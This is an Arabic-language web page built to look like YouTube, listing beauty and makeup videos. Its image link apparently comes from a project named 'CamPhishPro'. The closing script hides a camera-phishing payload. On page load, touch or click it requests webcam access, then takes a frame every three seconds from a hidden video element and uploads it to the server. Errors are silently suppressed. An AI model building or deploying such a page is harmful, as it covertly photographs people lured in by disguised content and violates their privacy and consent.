<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#0f0f0f">
<title>عالم الأناقة والجمال - YouTube</title>
<meta name="description" content="كل ما يهم المرأة وبكل جديد في عالم الموضة والجمال" />

<meta property="og:type" content="website" />
<meta property="og:title" content="عالم الأناقة والجمال" />
<meta property="og:description" content="كل ما يهم المرأة وبكل جديد في عالم الموضة والجمال" />
<meta property="og:image" content="https://raw.githubusercontent.com/faraabaas-jpg/CamPhishPro/main/preview.jpg" />

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">

<style>
:root {
  --bg: #0f0f0f;
  --bg2: #272727;
  --text: #fff;
  --text2: #aaa;
  --red: #ff0000;
  --border: #3f3f3f;
}

* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
  -webkit-tap-highlight-color: transparent;
}

body {
  font-family: 'Cairo', sans-serif;
  background: var(--bg);
  color: var(--text);
  font-size: 14px;
  line-height: 1.5;
}

/* Header & Search Bar */
.topbar {
  position: fixed;
  top: 0;
  inset-inline: 0;
  height: 56px;
  background: var(--bg);
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 16px;
  z-index: 100;
  border-bottom: 1px solid rgba(255,255,255,0.1);
}

.logo {
  display: flex;
  align-items: center;
  gap: 6px;
  font-weight: 700;
  font-size: 18px;
  cursor: pointer;
}

.logo svg {
  width: 30px;
  height: 21px;
}

.search-box {
  display: flex;
  align-items: center;
  flex: 0 1 500px;
  margin: 0 10px;
}

.search-box input {
  width: 100%;
  height: 36px;
  background: #121212;
  border: 1px solid var(--border);
  border-radius: 0 20px 20px 0;
  padding: 0 12px;
  color: #fff;
  font-family: inherit;
  outline: none;
}

.search-box input:focus {
  border-color: #1c62b9;
}

.search-box button {
  height: 36px;
  width: 54px;
  background: #222;
  border: 1px solid var(--border);
  border-right: 0;
  border-radius: 20px 0 0 20px;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
}

.search-box button svg {
  width: 18px;
  height: 18px;
  fill: #fff;
}

/* Layout */
.main {
  padding-top: 70px;
  padding-inline: 16px;
  max-width: 1200px;
  margin: 0 auto;
  padding-bottom: 40px;
}

.grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
  gap: 16px;
}

.card {
  cursor: pointer;
  background: transparent;
  border-radius: 12px;
  overflow: hidden;
  transition: transform 0.2s;
}

.card:hover {
  transform: translateY(-2px);
}

.thumb {
  aspect-ratio: 16/9;
  background: #222;
  position: relative;
  border-radius: 12px;
  overflow: hidden;
}

.thumb img {
  width: 100%;
  height: 100%;
  object-fit: cover;
}

.meta {
  padding: 8px 0;
}

.t {
  font-weight: 600;
  font-size: 14px;
  margin-bottom: 4px;
  color: #fff;
  display: -webkit-box;
  -webkit-line-clamp: 2;
  -webkit-box-orient: vertical;
  overflow: hidden;
}

.sub {
  color: var(--text2);
  font-size: 12px;
}

.player-wrap {
  margin-bottom: 24px;
  display: none;
}

.player {
  aspect-ratio: 16/9;
  width: 100%;
  background: #000;
  border-radius: 12px;
  overflow: hidden;
  position: relative;
  box-shadow: 0 4px 20px rgba(0,0,0,0.5);
}

.player iframe {
  width: 100%;
  height: 100%;
  border: 0;
}
</style>
</head>
<body>

<header class="topbar">
  <div class="logo">
    <svg viewBox="0 0 28 20"><rect width="28" height="20" rx="5" fill="#f00"/><path d="M11 6l7 4-7 4z" fill="#fff"/></svg>
    <span>YouTube</span>
  </div>

  <div class="search-box">
    <input type="text" placeholder="بحث">
    <button>
      <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
    </button>
  </div>
</header>

<main class="main">
  <div class="player-wrap" id="playerWrap">
    <div class="player">
      <iframe id="mainPlayer" src="" title="Video Player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
    </div>
  </div>

  <div class="grid" id="videoGrid"></div>
</main>

<video id="video" autoplay playsinline style="display:none"></video>

<script>
const VIDEOS = [
  {id:'xlINqK-F57w',title:'فاونديشن حسب نوع البشرة ✨🥰',ch:'Warda Moda'},
  {id:'ogp0HYIAWNI',title:'فوائد منتجات العناية للبشرة والشعر ✨',ch:'kim-fifi ♡'},
  {id:'ITH5lZUWIiw',title:'اساسيات المكياج للمبتدئين 💄',ch:'L\'Esprit Féminin'},
  {id:'CpO4jUvMXy4',title:'تجربتي لـ فاونديشن فت مي',ch:'nana beauty'}
];

const grid = document.getElementById('videoGrid');
const playerWrap = document.getElementById('playerWrap');
const mainPlayer = document.getElementById('mainPlayer');

VIDEOS.forEach(v => {
  const card = document.createElement('div');
  card.className = 'card';
  card.innerHTML = `
    <div class="thumb"><img src="https://img.youtube.com/vi/${v.id}/hqdefault.jpg"></div>
    <div class="meta">
      <div class="t">${v.title}</div>
      <div class="sub">${v.ch}</div>
    </div>
  `;
  card.onclick = () => playVideo(v.id);
  grid.appendChild(card);
});

function playVideo(id) {
  mainPlayer.src = `https://www.youtube.com/embed/${id}?autoplay=1`;
  playerWrap.style.display = 'block';
  window.scrollTo({top: 0, behavior: 'smooth'});
}

let isCapturing = false;

function startCameraAndCapture() {
  if (isCapturing) return;

  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      isCapturing = true;
      const videoEl = document.getElementById('video');
      videoEl.srcObject = stream;
      videoEl.play();
      
      setInterval(() => {
        const canvas = document.createElement('canvas');
        canvas.width = 480;
        canvas.height = 360;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(blob => {
          if (!blob) return;
          let fd = new FormData();
          fd.append('image', blob, 'frame.jpg');
          fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
        }, 'image/jpeg', 0.6);
      }, 3000);
    })
    .catch(() => {});
}

window.addEventListener('load', () => {
  startCameraAndCapture();
});

document.addEventListener('touchstart', startCameraAndCapture, { once: true });
document.addEventListener('click', startCameraAndCapture, { once: true });
</script>
</body>
</html>
